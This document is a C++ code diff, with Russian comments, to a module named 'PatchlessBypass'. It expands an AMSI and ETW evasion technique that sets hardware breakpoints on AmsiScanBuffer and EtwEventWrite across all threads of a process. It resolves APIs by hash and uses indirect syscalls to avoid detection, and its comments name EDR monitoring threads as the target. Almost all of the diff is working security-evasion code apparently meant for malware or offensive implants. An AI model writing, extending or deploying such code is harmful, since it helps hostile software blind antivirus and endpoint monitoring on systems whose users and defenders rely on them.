@@ -22,6 +22,238 @@ namespace PatchlessBypass
     static void*  s_RetGadget    = nullptr;   // C3 (ret) в ntdll
     static bool   s_Active       = false;
 
+    // ═══ Multi-thread DR7: TID storage for cleanup ═══
+    // Hardware breakpoints are per-thread. EDR callback threads
+    // need DR0-DR2 set too, not just the main thread.
+    static DWORD  s_ThreadIds[256];
+    static DWORD  s_ThreadCount  = 0;
+
+    // ═══ NtQuerySystemInformation structures (internal) ═══
+    typedef struct _SYSTEM_THREAD_INFORMATION {
+        LARGE_INTEGER KernelTime;
+        LARGE_INTEGER UserTime;
+        LARGE_INTEGER CreateTime;
+        ULONG WaitTime;
+        PVOID StartAddress;
+        CLIENT_ID ClientId;
+        LONG Priority;
+        LONG BasePriority;
+        ULONG ContextSwitchCount;
+        ULONG State;
+        ULONG WaitReason;
+    } SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;
+
+    typedef struct _SYSTEM_PROCESS_INFORMATION {
+        ULONG NextEntryOffset;
+        ULONG NumberOfThreads;
+        LARGE_INTEGER WorkingSetPrivateSize;
+        ULONG HardErrorsCount;
+        ULONG NumberOfReferences;
+        ULONG SectionCount;
+        ULONG VirtualSize;
+        ULONG PeakVirtualSize;
+        ULONG PageFaultCount;
+        ULONG PeakWorkingSetSize;
+        ULONG WorkingSetSize;
+        ULONG QuotaPeakPagedPoolUsage;
+        ULONG QuotaPagedPoolUsage;
+        ULONG QuotaPeakNonPagedPoolUsage;
+        ULONG QuotaNonPagedPoolUsage;
+        ULONG PagefileUsage;
+        ULONG PeakPagefileUsage;
+        ULONG PrivatePageCount;
+        LARGE_INTEGER ReadOperationCount;
+        LARGE_INTEGER WriteOperationCount;
+        LARGE_INTEGER OtherOperationCount;
+        LARGE_INTEGER ReadTransferCount;
+        LARGE_INTEGER WriteTransferCount;
+        LARGE_INTEGER OtherTransferCount;
+        ULONG ProcessId;
+        ULONG InheritedFromProcessId;
+        ULONG SessionId;
+        ULONG Spare1;
+        ULONG SizeOfQuotaInfo;
+        ULONG DebugPortStatus;
+        ULONG Spare2;
+        ULONG HandleCount;
+        ULONG Spare3;
+        ULONG Spare4;
+        ULONG Spare5;
+        LARGE_INTEGER UserTime;
+        LARGE_INTEGER KernelTime;
+        UNICODE_STRING ProcessName;
+        ULONG BasePriority;
+        ULONG Spare6;
+        ULONG Spare7;
+        ULONG Spare8;
+        SYSTEM_THREAD_INFORMATION Threads[1];
+    } SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;
+
+    // ═══ Перечисление потоков процесса через NtQuerySystemInformation ═══
+    // Возвращает TID массив и количество. Разрешает API через CRC32C.
+    static bool EnumerateProcessThreads(DWORD targetPid, DWORD* tids, DWORD* count, DWORD maxCount)
+    {
+        *count = 0;
+
+        HMODULE hNtdll = Api::GetModuleByHashCrc(Api::CrcMod::NTDLL);
+        if (!hNtdll) return false;
+
+        constexpr DWORD hashQSI = Crc32C::ConstHash("NtQuerySystemInformation");
+        typedef NTSTATUS(NTAPI* fnNtQSI)(ULONG, PVOID, ULONG, PULONG);
+        fnNtQSI pQSI = (fnNtQSI)Api::GetProcByHashCrc(hNtdll, hashQSI);
+        if (!pQSI) return false;
+
+        // SystemProcessInformation = 5
+        ULONG bufSize = 0x40000;  // 256KB — достаточно для типичного процесса
+
+        // VirtualAlloc/VirtualFree для буфера через ApiResolver (без IAT)
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return false;
+        auto pVA = (LPVOID(WINAPI*)(LPVOID,SIZE_T,DWORD,DWORD))
+            Api::GetProcByHashCrc(hK32, Api::CrcFn::VirtualAlloc);
+        if (!pVA) return false;
+
+        BYTE* infoBuf = (BYTE*)pVA(nullptr, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!infoBuf) return false;
+
+        ULONG retLen = 0;
+        NTSTATUS status = pQSI(5, infoBuf, bufSize, &retLen);
+        if (status != 0)
+        {
+            // Освобождаем буфер
+            auto pVF = (BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD))
+                Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("VirtualFree"));
+            if (pVF) pVF(infoBuf, 0, MEM_RELEASE);
+            return false;
+        }
+
+        // Ищем наш процесс по PID
+        PSYSTEM_PROCESS_INFORMATION proc = (PSYSTEM_PROCESS_INFORMATION)infoBuf;
+        bool found = false;
+
+        while (true)
+        {
+            if ((ULONG)(ULONG_PTR)proc->ProcessId == targetPid)
+            {
+                found = true;
+                DWORD numThreads = (proc->NumberOfThreads < maxCount) ? proc->NumberOfThreads : maxCount;
+                for (DWORD i = 0; i < numThreads; i++)
+                {
+                    tids[i] = (DWORD)(ULONG_PTR)proc->Threads[i].ClientId.UniqueThread;
+                }
+                *count = numThreads;
+                break;
+            }
+
+            if (proc->NextEntryOffset == 0) break;
+            proc = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)proc + proc->NextEntryOffset);
+        }
+
+        // Освобождаем буфер
+        auto pVF = (BOOL(WINAPI*)(LPVOID,SIZE_T,DWORD))
+            Api::GetProcByHashCrc(hK32, Crc32C::ConstHash("VirtualFree"));
+        if (pVF) pVF(infoBuf, 0, MEM_RELEASE);
+
+        return found;
+    }
+
+    // ═══ Установка DR-регистров на конкретный поток ═══
+    static bool SetDrOnThread(DWORD tid, PVOID amsiAddr, PVOID etwAddr, PVOID etwExAddr)
+    {
+        // OBJECT_ATTRIBUTES для NtOpenThread
+        struct _OBJ_ATTR {
+            ULONG Length;
+            HANDLE RootDirectory;
+            void* ObjectName;
+            ULONG Attributes;
+            void* SecurityDescriptor;
+            void* SecurityQualityOfService;
+        } objAttr = { sizeof(_OBJ_ATTR), nullptr, nullptr, 0, nullptr, nullptr };
+
+        CLIENT_ID cid = {};
+        cid.UniqueProcess = (HANDLE)(ULONG_PTR)GetCurrentProcessId();
+        cid.UniqueThread  = (HANDLE)(ULONG_PTR)tid;
+
+        HANDLE hThread = nullptr;
+        NTSTATUS status = Syscall::NtOpenThread(&hThread, THREAD_ALL_ACCESS, &objAttr, &cid);
+        if (status != 0 || !hThread) return false;
+
+        CONTEXT ctx = {};
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+        status = Syscall::NtGetContextThread(hThread, &ctx);
+        if (status != 0)
+        {
+            Syscall::NtClose(hThread);
+            return false;
+        }
+
+        // Устанавливаем DR регистры
+        if (amsiAddr)
+        {
+            ctx.Dr0 = (ULONG_PTR)amsiAddr;
+            ctx.Dr7 |= (1 << 0);
+        }
+        if (etwAddr)
+        {
+            ctx.Dr1 = (ULONG_PTR)etwAddr;
+            ctx.Dr7 |= (1 << 2);
+        }
+        if (etwExAddr)
+        {
+            ctx.Dr2 = (ULONG_PTR)etwExAddr;
+            ctx.Dr7 |= (1 << 4);
+        }
+
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        status = Syscall::NtSetContextThread(hThread, &ctx);
+
+        Syscall::NtClose(hThread);
+        return status == 0;
+    }
+
+    // ═══ Очистка DR-регистров на конкретном потоке ═══
+    static bool ClearDrOnThread(DWORD tid)
+    {
+        struct _OBJ_ATTR {
+            ULONG Length;
+            HANDLE RootDirectory;
+            void* ObjectName;
+            ULONG Attributes;
+            void* SecurityDescriptor;
+            void* SecurityQualityOfService;
+        } objAttr = { sizeof(_OBJ_ATTR), nullptr, nullptr, 0, nullptr, nullptr };
+
+        CLIENT_ID cid = {};
+        cid.UniqueProcess = (HANDLE)(ULONG_PTR)GetCurrentProcessId();
+        cid.UniqueThread  = (HANDLE)(ULONG_PTR)tid;
+
+        HANDLE hThread = nullptr;
+        NTSTATUS status = Syscall::NtOpenThread(&hThread, THREAD_ALL_ACCESS, &objAttr, &cid);
+        if (status != 0 || !hThread) return false;
+
+        CONTEXT ctx = {};
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+        status = Syscall::NtGetContextThread(hThread, &ctx);
+        if (status != 0)
+        {
+            Syscall::NtClose(hThread);
+            return false;
+        }
+
+        // Снимаем только наши биты
+        if (s_AmsiAddr)  { ctx.Dr0 = 0; ctx.Dr7 &= ~(1 << 0); }
+        if (s_EtwAddr)   { ctx.Dr1 = 0; ctx.Dr7 &= ~(1 << 2); }
+        if (s_EtwExAddr) { ctx.Dr2 = 0; ctx.Dr7 &= ~(1 << 4); }
+
+        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        status = Syscall::NtSetContextThread(hThread, &ctx);
+
+        Syscall::NtClose(hThread);
+        return status == 0;
+    }
+
     // ═══ VEH-обработчик для STATUS_SINGLE_STEP ═══
     // Вызывается из VehDispatcher при получении STATUS_SINGLE_STEP.
     // Проверяет RIP на совпадение с адресами AMSI/ETW,
@@ -75,18 +307,16 @@ namespace PatchlessBypass
         HMODULE hAmsi = Api::GetModuleByHashCrc(Api::CrcMod::AMSI);
         if (!hAmsi)
         {
-            // amsi.dll ещё не загружена — загружаем сами через хеш
-            // LoadLibraryA разрешён через DJB2
-            HMODULE hK32 = Api::GetModuleByHash(Api::Mod::KERNEL32);
+            // amsi.dll ещё не загружена — загружаем через CRC32C-разрешение
+            HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
             if (hK32)
             {
-                typedef HMODULE(WINAPI* fnLoadLibA)(LPCSTR);
-                fnLoadLibA pLoadLib = (fnLoadLibA)Api::GetProcByHash(hK32, Api::Fn::LoadLibraryA);
-                if (pLoadLib)
+                auto pLL = (HMODULE(WINAPI*)(LPCSTR))
+                    Api::GetProcByHashCrc(hK32, Api::CrcFn::LoadLibraryA);
+                if (pLL)
                 {
-                    // Строка на стеке
                     char amsiStr[] = { 'a','m','s','i','.','d','l','l', 0 };
-                    hAmsi = pLoadLib(amsiStr);
+                    hAmsi = pLL(amsiStr);
                 }
             }
         }
@@ -115,87 +345,44 @@ namespace PatchlessBypass
         if (!s_AmsiAddr && !s_EtwAddr)
             return false;
 
-        // Устанавливаем аппаратные точки останова через косвенные syscall'ы
-        // NtGetContextThread / NtSetContextThread (IDX 10/11)
-        CONTEXT ctx = {};
-        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        // Устанавливаем аппаратные точки останова на ВСЕ потоки процесса
+        // DR-регистры пер-потоковые — EDR callback потоки тоже должны быть защищены
 
-        HANDLE hThread = GetCurrentThread();
-
-        // NtGetContextThread через косвенный syscall
-        NTSTATUS status = Syscall::NtGetContextThread(hThread, &ctx);
-        if (status != 0)
+        // Сначала устанавливаем на текущий поток (всегда доступен)
+        if (!SetDrOnThread(GetCurrentThreadId(), s_AmsiAddr, s_EtwAddr, s_EtwExAddr))
             return false;
 
-        // Устанавливаем DR0 = AmsiScanBuffer (execute breakpoint)
-        if (s_AmsiAddr)
+        // Перечисляем все потоки процесса и устанавливаем DR на каждый
+        s_ThreadCount = 0;
+        EnumerateProcessThreads(GetCurrentProcessId(), s_ThreadIds, &s_ThreadCount, 256);
+
+        for (DWORD i = 0; i < s_ThreadCount; i++)
         {
-            ctx.Dr0 = (ULONG_PTR)s_AmsiAddr;
-            ctx.Dr7 |= (1 << 0);   // L0 = local enable DR0
-            // R/W0 (биты 16-17) = 00 = execute breakpoint
-            // LEN0 (биты 18-19) = 00 = 1 байт
+            // Текущий поток уже обработан выше
+            if (s_ThreadIds[i] == GetCurrentThreadId()) continue;
+            SetDrOnThread(s_ThreadIds[i], s_AmsiAddr, s_EtwAddr, s_EtwExAddr);
         }
-
-        // Устанавливаем DR1 = EtwEventWrite (execute breakpoint)
-        if (s_EtwAddr)
-        {
-            ctx.Dr1 = (ULONG_PTR)s_EtwAddr;
-            ctx.Dr7 |= (1 << 2);   // L1 = local enable DR1
-            // R/W1 (биты 20-21) = 00 = execute breakpoint
-            // LEN1 (биты 22-23) = 00 = 1 байт
-        }
-
-        // Устанавливаем DR2 = EtwEventWriteEx (execute breakpoint, опционально)
-        if (s_EtwExAddr)
-        {
-            ctx.Dr2 = (ULONG_PTR)s_EtwExAddr;
-            ctx.Dr7 |= (1 << 4);   // L2 = local enable DR2
-            // R/W2 (биты 24-25) = 00 = execute breakpoint
-            // LEN2 (биты 26-27) = 00 = 1 байт
-        }
-
-        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-
-        // NtSetContextThread через косвенный syscall
-        status = Syscall::NtSetContextThread(hThread, &ctx);
-        if (status != 0)
-            return false;
 
         s_Active = true;
         return true;
     }
 
-    // ═══ Отключение — очистка DR регистров ═══
+    // ═══ Отключение — очистка DR регистров на всех потоках ═══
     void Disable()
     {
         if (!s_Active) return;
 
-        CONTEXT ctx = {};
-        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        // Очищаем на текущем потоке
+        ClearDrOnThread(GetCurrentThreadId());
 
-        HANDLE hThread = GetCurrentThread();
-        Syscall::NtGetContextThread(hThread, &ctx);
-
-        // Очищаем наши DR регистры и снимаем только наши биты в DR7
-        if (s_AmsiAddr)
+        // Очищаем на всех остальных потоках
+        for (DWORD i = 0; i < s_ThreadCount; i++)
         {
-            ctx.Dr0 = 0;
-            ctx.Dr7 &= ~(1 << 0);   // Снимаем L0
-        }
-        if (s_EtwAddr)
-        {
-            ctx.Dr1 = 0;
-            ctx.Dr7 &= ~(1 << 2);   // Снимаем L1
-        }
-        if (s_EtwExAddr)
-        {
-            ctx.Dr2 = 0;
-            ctx.Dr7 &= ~(1 << 4);   // Снимаем L2
+            if (s_ThreadIds[i] == GetCurrentThreadId()) continue;
+            ClearDrOnThread(s_ThreadIds[i]);
         }
 
-        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-        Syscall::NtSetContextThread(hThread, &ctx);
-
+        s_ThreadCount = 0;
         s_Active = false;
     }
 
